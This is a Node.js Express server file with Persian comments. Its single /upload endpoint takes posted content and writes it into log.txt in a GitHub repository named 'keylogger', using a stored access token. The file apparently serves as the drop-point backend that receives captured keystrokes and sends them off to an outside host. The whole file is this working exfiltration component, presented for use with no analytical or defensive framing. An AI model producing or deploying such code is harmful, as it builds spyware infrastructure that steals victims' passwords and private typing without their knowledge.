const express = require("express");
const app = express();
const axios = require("axios");
const dotenv = require("dotenv");
dotenv.config();

app.use(express.static("public"));
app.use(express.json());

app.post("/upload", async (req, res) => {
  const content = req.body.content;

  const githubRepo = "Adriyan1361/keylogger"; // جایگزین کن
  const filePath = "log.txt"; // مسیر فایل تو رپو
  const token = process.env.GITHUB_TOKEN;

  const url = `https://api.github.com/repos/${githubRepo}/contents/${filePath}`;

  try {
    // دریافت SHA برای آپدیت
    const { data } = await axios.get(url, {
      headers: {
        Authorization: `token ${token}`,
        Accept: "application/vnd.github+json"
      }
    });

    const sha = data.sha;

    // آپدیت فایل
    await axios.put(
      url,
      {
        message: "Update log.txt",
        content: Buffer.from(content).toString("base64"),
        sha
      },
      {
        headers: {
          Authorization: `token ${token}`,
          Accept: "application/vnd.github+json"
        }
      }
    );

    res.json({ message: "✅ log.txt uploaded to GitHub." });
  } catch (err) {
    res.json({ message: "❌ Failed: " + err.message });
  }
});

app.listen(3000, () => {
  console.log("Server running on http://localhost:3000");
});
